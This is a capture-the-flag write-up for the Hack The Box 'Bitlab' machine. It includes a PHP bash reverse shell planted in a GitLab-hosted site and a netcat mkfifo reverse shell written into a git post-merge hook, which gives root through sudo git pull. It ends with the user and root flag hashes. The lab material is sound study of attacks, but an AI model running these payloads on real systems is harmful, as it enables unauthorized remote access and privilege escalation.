---
title: Bitlab Writeup
date: 2019-04-12 14:10:00 +0800
categories: [Pentesting]
tags: [htb]
seo:
  date_modified: 2020-03-07 20:43:16 -0500
---

## Enumeration

Beginning with a simple scan of the first 10000 ports

![Bitlab/Screen_Shot_2019-12-04_at_3.00.14_PM.png](/assets/img/bitlab/Screen_Shot_2019-12-04_at_3.00.14_PM.png)

Nothing crazy. We see a web server, we go on the web. It is a gitlab server.

![Bitlab/Screen_Shot_2019-12-04_at_3.13.52_PM.png](/assets/img/bitlab/Screen_Shot_2019-12-04_at_3.13.52_PM.png)

Normally I would run gobuster on it but I wanted to explore the site manually. On the bottom of the site, I clicked on the help link and another link showed up. That also lead to a list of links.

![Bitlab/Screen_Shot_2019-12-04_at_3.13.01_PM.png](/assets/img/bitlab/Screen_Shot_2019-12-04_at_3.13.01_PM.png)

Gitlab Login looks interested. The link didn't go anything. All it had was obfuscated javascript. If we beautifier and decode the hex code, we are presented with a username and password.

![Bitlab/Screen_Shot_2019-12-04_at_4.22.12_PM.png](/assets/img/bitlab/Screen_Shot_2019-12-04_at_4.22.12_PM.png)

decoded:

![Bitlab/Screen_Shot_2019-12-04_at_4.26.59_PM.png](/assets/img/bitlab/Screen_Shot_2019-12-04_at_4.26.59_PM.png)

After login, we have two projects to explore. The Deployer project didn't really spark me as the Profile project. The profile project seems to be the source code of the developer's website. First thing I did was upload a php reverse shell at the bottom of index.html. Commit the changes and merge it to master

    <?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.32/1234 0>&1'");

Going to `[http://10.10.10.114/profile](http://10.10.10.114/profile)` activates the shell

![Bitlab/Screen_Shot_2019-12-04_at_4.47.25_PM.png](/assets/img/bitlab/Screen_Shot_2019-12-04_at_4.47.25_PM.png)

## Privilege Escalation

I like to see if my current user can run any command as root or another user. And for us, we can sudo git pull.

![Bitlab/Screen_Shot_2019-12-04_at_4.53.11_PM.png](/assets/img/bitlab/Screen_Shot_2019-12-04_at_4.53.11_PM.png)

 I have been working gitlab for a while now. I got to know about git hooks. Git hooks are basically scripts that can be executed depending on what git command you used. Some of them are post-merge, pre-commit and so much more. Take a look at this [article](https://www.atlassian.com/git/tutorials/git-hooks) and this [one](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) if you are interested in learning more about it. The exploit I used was similar to a project I was working on when learning about git. Here is the [link](https://github.com/emmaunel/CaptainHook) to it.

For this box, I used post-merge for my attack. Post merge is executed after a git merge has been done.

Start by copying the `.git` from the `/var/www/html/profile` to `/tmp/`. Now we echo a netcat reverse shell into post-merge in `/tmp/.git`. Next, we make a change to the README.md on the webserver and merge the changes. In your shell, do sudo git pull and that should give a root shell(make sure you are listening). This code snippet  below is exactly what explained in words:

    www-data@bitlab:/var/www/html/profile$ cp -R .git /tmp/
    www-data@bitlab:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 1337 >/tmp/f" > .git/hooks/post-merge
    www-data@bitlab:/tmp$ chmod 777 .git/hooks/post-merge
    **Make a change to README.md on the web**
    www-data@bitlab:/tmp$ sudo /usr/bin/git pull

Here's our listener with a root shell.

![Bitlab/Screen_Shot_2019-12-04_at_5.37.35_PM.png](/assets/img/bitlab/Screen_Shot_2019-12-04_at_5.37.35_PM.png)

Obviously this is an unintended way (jumping from www-data to root). I believe the intended way is to find some creds for the SQL database to get the user' s password. And from there ...(come back)

`User: 1e3fd81ec3aa2f1462370ee3c20b8154`

`Root: 8d4cc131757957cb68d9a0cddccd587c`